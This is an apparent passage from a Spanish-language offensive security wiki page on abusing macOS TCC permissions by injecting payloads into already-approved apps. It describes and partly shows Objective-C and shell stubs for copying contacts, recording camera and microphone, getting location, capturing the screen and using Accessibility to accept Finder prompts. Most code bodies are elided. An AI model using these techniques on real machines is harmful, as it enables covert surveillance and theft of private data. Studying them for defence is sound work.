...
> [!WARNING]
> Esta sigue siendo una vía de ataque muy realista: investigaciones recientes sobre el robo de permisos contra apps de Microsoft para macOS demostraron que una **validación débil de bibliotecas / carga de plugins** puede permitir que un atacante reutilice los permisos de TCC ya concedidos de la app víctima para la **cámara**, el **micrófono** y otros recursos, sin un segundo aviso.

## Triage rápido antes de usar un payload

Las investigaciones recientes sobre el robo de permisos siguen reforzando el mismo flujo de trabajo: primero hay que encontrar una app que ya tenga el permiso de TCC que se desea y, después, verificar que sea un objetivo de inyección realista.<sup>[1]</sup>
```bash
...
```
Si el objetivo también carga plug-ins / frameworks controlados por el atacante, estos payloads se vuelven mucho más interesantes. Para obtener ideas más amplias de post-exploitation después de acceder a un proceso ya aprobado, consulta [esta página relacionada](macos-tcc-credential-and-data-theft.md).
...
{{#tabs}}
{{#tab name="ObjetiveC"}}
Copia `$HOME/Library/Application Support/AddressBook` en `/tmp/contacts`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
...
Graba un video de 3 s y guárdalo en **`/tmp/recording.mov`**<sup>[5]</sup>
```objectivec
#import <Foundation/Foundation.h>
...
Comprueba si el programa tiene acceso a la cámara.<sup>[5]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
...
Activa el aviso de la cámara si el proceso actual todavía está en `NotDetermined`.
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
...
{{#tab name="ObjectiveC - Check"}}
Comprueba si la aplicación tiene acceso al micrófono.<sup>[5]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
...
{{#tab name="ObjectiveC - Prompt"}}
Activa el aviso del micrófono si el proceso actual aún está en `NotDetermined`.
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
...
> [!TIP]
> Para que una app obtenga la ubicación, los **Servicios de localización** (en Privacidad y seguridad) **deben estar activados**; de lo contrario, no podrá acceder a ella.
...
{{#tab name="Shell"}}
Obtén la ubicación actual desde Shell.<sup>[2]</sup>
```bash
...
```
> [!TIP]
> Esto todavía depende de que **Location Services** esté habilitado y de que la herramienta / terminal obtenga la aprobación de TCC. `CoreLocationCLI` también depende de la localización asistida por Wi-Fi en la mayoría de los Mac, por lo que tener el Wi-Fi deshabilitado suele terminar en `kCLErrorDomain error 0`.
...
> [!TIP]
> En **macOS 12.3+**, `ScreenCaptureKit` suele ser una primitiva de post-exploitation mejor que `AVCaptureScreenInput`: permite streaming de alto rendimiento, capturas de un solo fotograma con `SCScreenshotManager` y transmitir **audio del sistema**. Las actualizaciones recientes de `ScreenCaptureKit` también añadieron `captureMicrophone` / `microphoneCaptureDeviceID` en `SCStreamConfiguration`, además de `SCRecordingOutput` para grabar directamente en un archivo, por lo que un cliente de captura de pantalla secuestrado puede guardar directamente la pantalla y el audio del sistema, y añadir audio del micrófono cuando el proceso también tiene `kTCCServiceMicrophone`. Para consultar más primitivas de abuso de la sesión de escritorio, visita [esta página relacionada](../macos-input-monitoring-screen-capture-accessibility.md).
...
Usa el privilegio de TCC para aceptar el control de Finder pulsando enter y omitir TCC de esa forma.
...
Comprueba si el proceso actual ya tiene confianza para Accessibility y solicita a macOS que muestre la interfaz de consentimiento si no la tiene.
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
__attribute__((constructor))
...
> [!CAUTION] > **La accesibilidad es un permiso muy poderoso**; podrías abusar de ella de otras formas. Por ejemplo, podrías realizar el **keystrokes attack** únicamente mediante ella, sin necesidad de llamar a System Events.
...
- [6] [Vicarius vsociety - CVE-2023-26818: Exploit de bypass de macOS TCC con Telegram (parte 1)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
